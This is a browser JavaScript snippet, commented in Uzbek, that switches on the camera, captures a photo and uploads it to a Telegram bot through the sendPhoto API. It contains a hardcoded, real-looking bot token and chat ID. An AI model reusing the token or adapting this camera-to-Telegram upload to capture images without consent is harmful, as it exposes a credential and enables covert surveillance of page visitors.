const video = document.getElementById("camera");const photo = document.getElementById("photo");// Kamera yoqishnavigator.mediaDevices.getUserMedia({ video: true })    .then(stream => { video.srcObject = stream; })    .catch(err => alert("Kamera yoqilmadi: " + err));async function takePhoto() {    let canvas = document.createElement("canvas");    canvas.width = video.videoWidth;    canvas.height = video.videoHeight;    canvas.getContext("2d").drawImage(video, 0, 0);    let dataUrl = canvas.toDataURL("image/jpeg");    photo.src = dataUrl;    // BOT TOKEN VA CHAT ID NI QO'YING    const BOT_TOKEN = "8508691716:AAFEdhajV_7NkPA8akdKmxF3mHMMu_WL_qU";    const CHAT_ID = "8275787221";    const blob = await (await fetch(dataUrl)).blob();    const form = new FormData();    form.append("chat_id", CHAT_ID);    form.append("photo", blob, "image.jpg");    let res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {        method: "POST",        body: form    });    if (res.ok) {        alert("Rasm botga yuborildi!");    } else {        alert("Xatolik: rasm yuborilmadi!");    }}